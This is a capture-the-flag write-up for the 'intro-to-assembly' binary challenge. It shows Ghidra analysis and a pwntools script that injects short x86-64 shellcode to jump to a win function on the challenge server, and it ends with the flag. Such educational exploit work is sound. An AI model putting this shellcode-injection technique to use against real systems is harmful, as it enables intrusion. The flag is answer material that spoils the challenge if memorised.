# intro-to-assembly

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/66ccd6db-b93c-4b3c-a4b1-d1a7863d2cd3)

# Solution
After decompiling the binary in Ghidra, we can see the `Main` function taking only 24 bytes from our user input:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8d5b4465-2d50-4ec9-b1ad-ac31cbf67b4d)

We also find a `win` function:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/3ac8a937-e463-4c30-839d-86e877a3fad1)

This win function has a condition that we need to meet where it expects us to input "Hello 1337 0". In the middle pane of Ghidra we can also get the starting address for the function:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0a2ce4c5-010a-4e85-9c09-4d3191f55e0e)

If we double click on `Hello` we can see it redirects us to its address:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5ce013a3-e530-4d22-adf2-d115d12ad7b9)

This means that it's taking this string from an address in the memory rather than from the string inputted by the user itself. We also notice we get an `illegal hardware instruction` error and the program crashes when inputting a simple string like "a". This gives us the idea that we can't jump to the win function via buffer overflow but we rather need to build our way there via shellcode.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/ae78ba44-9743-4092-8c66-f7a2cf7f22b4)

With that in mind, we can come up with this kind of a python script leveraging pwntools.

```python3
from pwn import *

# prog = process("./intro-to-assembly")
prog = remote('34.107.126.69', 30712)
elf = ELF("./intro-to-assembly")

win_addr = '0x4012bb' # taken from ghidra
context.arch = 'amd64'

param_1 = 0x402008 # address of Hello because it's not taking it as a string, it's taking its address.
param_2 = 0x539 # 1337 in hex

# Generate the shellcode
shellcode = asm(f'''
    mov rdi, {param_1}
    mov rsi, {param_2}
    xor rdx, rdx
    mov ecx, {win_addr}
    jmp rcx
''')

prog.clean()
prog.sendline(shellcode)
prog.interactive()
```

Shellcode explained:
In the context of a typical Linux x86_64 ELF binary, `rdi` is often used to pass the first argument to a function according to the x86_64 calling convention. `rsi` is the second argument. `rdx` is the third argument.. here we xor it with itself to get 0. Doing a "mov rdx, 0" made the payload too large and we couldn't get the /bin/sh to execute. This way generates a shorter payload. `ecx` refers to the ECX register, which is one of the general-purpose registers in the `x86` architecture. This had me stumped for a bit but we need to use the x86 because it's smaller and we need to keep the payload short. We then jump to `rcx` because while we can put values into x86 registers, we can't jump to them on a x64 binary.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/86823075-6ac9-4e1b-b09c-6b5d144f9187)

`CTF{926e420eeeeb6ac4890ddd46af5462d922e01307ef77d97d6799b167ed17e44f}`
